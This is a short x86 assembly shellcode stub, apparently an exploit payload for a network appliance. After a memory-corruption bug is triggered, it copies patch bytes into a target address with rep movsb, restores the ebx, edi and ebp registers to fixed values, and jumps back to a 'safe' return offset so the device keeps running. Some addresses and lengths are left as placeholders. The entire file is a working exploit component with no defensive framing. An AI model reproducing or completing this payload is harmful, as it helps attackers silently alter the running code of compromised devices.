BITS 32

SAFERET_OFFSET  equ     0x9277386       ; where to continue execution

; we need to fix the function frame to continue normal operation
; eax = 0x0
; esi = 0x0
; edi = 0x0b
; ebx = 0x10
; ebp = [esp - 0x4 (ret)] + 0x??
FIX_EBP         equ     0x48            ; this is 0x58 in versions before 8.4(1)
FIX_EDI         equ     0x0f0f0f0b      ; seems static?
FIX_EBX         equ     0x10            ; seems static?

_start:

    ; these are registers we have to clean up, so we can null them before save
    xor ebx, ebx
    xor esi, esi
    xor ecx, ecx                        ; ecx is volatile register
    xor eax, eax

    ; we can just take stack offset instead of jmp/call/pop/rep
    mov esi, esp                        ; lea esi, [esp + _bytes_to_write - 4]
    add esi, 0xff                       ; change 0xff to distance of _bytes_to_write - 4
    
    
    add cl, 0xff                        ; change 0xff to 82 - shellcode_size
    mov edi, 0xffffffff                 ; destination for this round
    rep movsb                           ; write until ecx == 0


    ; these registers are pre-xored
    add bl, FIX_EBX
    mov edi, FIX_EDI

    lea ebp, [esp + FIX_EBP - 4]

    jmp SAFERET_OFFSET                                 ; return to safe address

_bytes_to_write:
    ; store patch bytes here
